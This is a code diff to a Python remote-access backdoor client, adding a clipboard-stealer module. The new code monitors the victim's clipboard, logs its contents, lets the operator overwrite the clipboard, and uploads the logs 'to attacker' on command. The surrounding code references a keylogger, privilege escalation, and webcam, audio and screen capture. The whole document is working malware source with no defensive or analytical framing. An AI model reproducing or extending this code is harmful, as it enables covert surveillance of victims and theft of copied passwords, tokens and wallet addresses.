@@ -21,6 +21,7 @@ try:
     from features.privilege_escalation import PrivilegeEscalation
     from features.media_capture_tool import ScreenCapture, AudioCapture, WebcamCapture, ScreenRecorder
     from features.network_discovery import NetworkDiscovery
+    from features.clipboard_stealer import ClipboardStealer, FallbackClipboardStealer, PYPERCLIP_AVAILABLE
     FEATURES_AVAILABLE = True
 except ImportError:
     FEATURES_AVAILABLE = False
@@ -44,6 +45,7 @@ class BackdoorClient:
             self.webcam_capture = WebcamCapture()
             self.screen_recorder = ScreenRecorder()
             self.network_discovery = NetworkDiscovery()
+            self.clipboard_stealer = ClipboardStealer() if PYPERCLIP_AVAILABLE else FallbackClipboardStealer()
         else:
             self.keylogger = None
             self.priv_esc = None
@@ -52,6 +54,7 @@ class BackdoorClient:
             self.webcam_capture = None
             self.screen_recorder = None
             self.network_discovery = None
+            self.clipboard_stealer = None
     
     def reliable_send(self, data):
         """Send data in a reliable way (encoded as JSON)"""
@@ -449,6 +452,89 @@ class BackdoorClient:
                     self.reliable_send("Network discovery feature not available")
                 return 'continue'
             
+            # Clipboard stealer commands
+            
+            # start clipboard monitoring
+            elif command == 'clipboard_start':
+                if self.clipboard_stealer:
+                    result = self.clipboard_stealer.start()
+                    self.reliable_send(result)
+                else:
+                    self.reliable_send("Clipboard stealer feature not available")
+                return 'continue'
+            
+            # stop clipboard monitoring
+            elif command == 'clipboard_stop':
+                if self.clipboard_stealer:
+                    result = self.clipboard_stealer.stop()
+                    self.reliable_send(result)
+                else:
+                    self.reliable_send("Clipboard stealer feature not available")
+                return 'continue'
+            
+            # get clipboard status
+            elif command == 'clipboard_status':
+                if self.clipboard_stealer:
+                    status = self.clipboard_stealer.get_status()
+                    self.reliable_send(json.dumps(status, indent=2))
+                else:
+                    self.reliable_send("Clipboard stealer feature not available")
+                return 'continue'
+            
+            # get latest clipboard content
+            elif command == 'clipboard_get':
+                if self.clipboard_stealer:
+                    result = self.clipboard_stealer.get_latest_clipboard()
+                    self.reliable_send(result)
+                else:
+                    self.reliable_send("Clipboard stealer feature not available")
+                return 'continue'
+            
+            # set clipboard content
+            elif command.startswith('clipboard_set '):
+                if self.clipboard_stealer:
+                    content = command[14:]  # Remove 'clipboard_set '
+                    result = self.clipboard_stealer.set_clipboard(content)
+                    self.reliable_send(result)
+                else:
+                    self.reliable_send("Clipboard stealer feature not available")
+                return 'continue'
+            
+            # dump clipboard logs
+            elif command == 'clipboard_dump':
+                if self.clipboard_stealer:
+                    log_file = self.clipboard_stealer.log_file
+                    
+                    # Check if log file exists and has content
+                    if os.path.exists(log_file) and os.path.getsize(log_file) > 0:
+                        # Send confirmation message
+                        self.reliable_send(f"Clipboard log file ready: {log_file}")
+                        # Automatically upload the file to attacker
+                        self.upload_file(log_file)
+                    else:
+                        self.reliable_send("No clipboard log file found or file is empty")
+                else:
+                    self.reliable_send("Clipboard stealer feature not available")
+                return 'continue'
+            
+            # clear clipboard logs
+            elif command == 'clipboard_clear':
+                if self.clipboard_stealer:
+                    result = self.clipboard_stealer.clear_logs()
+                    self.reliable_send(result)
+                else:
+                    self.reliable_send("Clipboard stealer feature not available")
+                return 'continue'
+            
+            # list clipboard log files
+            elif command == 'clipboard_list':
+                if self.clipboard_stealer:
+                    result = self.clipboard_stealer.list_logs()
+                    self.reliable_send(result)
+                else:
+                    self.reliable_send("Clipboard stealer feature not available")
+                return 'continue'
+            
             # System information
             elif command == 'sysinfo':
                 result = self.get_system_info()
@@ -523,7 +609,17 @@ class BackdoorClient:
         net_public_ip       - Get public IP address
         net_check_internet  - Check internet connectivity
 
-        Note: Some features require additional libraries (pynput, PIL, pyaudio, opencv-python)
+        CLIPBOARD STEALER:
+        clipboard_start     - Start monitoring clipboard
+        clipboard_stop      - Stop monitoring clipboard
+        clipboard_status    - Check clipboard monitor status
+        clipboard_get       - Get current clipboard content
+        clipboard_set <text> - Set clipboard content
+        clipboard_dump      - Download clipboard log file
+        clipboard_clear     - Clear clipboard logs
+        clipboard_list      - List all clipboard log files
+
+        Note: Some features require additional libraries (pynput, PIL, pyaudio, opencv-python, pyperclip)
         """
         self.reliable_send(help_text)
     
